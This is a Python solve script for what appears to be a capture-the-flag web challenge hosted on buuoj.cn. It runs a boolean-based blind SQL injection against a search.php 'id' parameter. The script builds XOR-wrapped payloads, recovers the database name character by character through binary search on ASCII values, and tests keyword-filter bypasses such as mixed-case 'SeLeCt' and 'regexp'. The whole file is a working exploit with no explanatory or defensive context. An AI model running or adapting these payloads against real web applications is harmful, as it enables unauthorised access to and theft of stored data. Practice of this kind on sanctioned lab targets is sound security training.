#!/usr/bin/env python3
import requests
import time

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(ERROR), False = 条件为假(Clever)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text or "Error" in r.text
    except:
        return False

def get_length(query, max_len=100):
    """获取字符串长度"""
    for i in range(1, max_len):
        payload = f"6^(({query})={i})"
        if check(payload):
            return i
    return 0

def get_char_binary(query, pos):
    """二分查找字符"""
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"6^(ascii(substr(({query}),{pos},1))>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else ""

def blind_extract(query, name=""):
    """盲注提取数据"""
    length = get_length(query)
    print(f"[*] {name} length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char_binary(query, i)
        result += c
        print(f"    {name}: {result}")
        time.sleep(0.05)
    return result

# 测试
print("[*] Testing logic...")
print(f"    6^(1=1) should be True(ERROR): {check('6^(1=1)')}")
print(f"    6^(1=0) should be False(Clever): {check('6^(1=0)')}")

# 获取数据库名
db = blind_extract("database()", "Database")

# 测试 SeLeCt 是否可用
print("\n[*] Testing SeLeCt...")
print(f"    SeLeCt(1)=1: {check('6^(SeLeCt(1)=1)')}")

# 测试 regexp
print("\n[*] Testing regexp...")
test = check('6^(SeLeCt(database())regexp"^g")')
print(f"    SeLeCt(database())regexp'^g': {test}")

